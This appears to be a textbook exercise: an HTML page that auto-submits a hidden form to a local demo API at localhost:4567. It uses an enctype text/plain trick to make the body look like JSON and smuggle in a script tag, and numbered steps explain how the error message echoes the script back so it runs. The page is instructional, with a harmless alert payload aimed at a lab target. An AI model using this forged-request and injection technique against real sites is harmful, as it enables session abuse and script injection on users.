    <form id="test" action="http://localhost:4567/spaces" method="post" enctype="text/plain">
      <input
        type="hidden"
        name='{"x":"'
        value='","name":"x", "owner":"&lt;script&gt;alert(&apos;XSS!&apos;); &lt;/script&gt;"}' />
      <p>
        HTML form with the enctype attribute set to text/plain . This instructs the web browser to format the
        fields in the form as plain text field=value pairs, which you are exploiting to make the output look
        like valid JSON
      </p>

      <ul>
        <li>
          1 When the form is submitted, the browser sends a POST request to http:/ /local- host:4567/spaces
          with a Content-Type header of text/plain and the hidden form field as the value. When the browser
          submits the form, it takes each form element and submits them as name=value pairs. The &lt;, &gt;
          and &apos; HTML entities are replaced with the literal values <, >, and ' respectively.
        </li>
        <li>
          2 The name of your hidden input field is '{"x":"', although the value is your long malicious script.
          When the two are put together the API will see the follow- ing form input:
          {"x":"=","name":"x","owner":"
          <script>
            alert('XSS!')
          </script>
          "}
        </li>
        <li>
          3 The API sees a valid JSON input and ignores the extra “x” field (which you only added to cleverly
          hide the equals sign that the browser inserted). But the API rejects the username as invalid,
          echoing it back in the response: {"error": "java.lang.IllegalArgumentException: invalid username:
          <script>
            alert('XSS!')
          </script>
          "}
        </li>
        <li>
          4 Because your error response was served with the default Content-Type of text/html, the browser
          happily interprets the response as HTML and executes the script, resulting in the XSS popup.
        </li>
      </ul>
    </form>
    <script type="text/javascript">
      document.getElementById('test').submit()
    </script>
  </body>
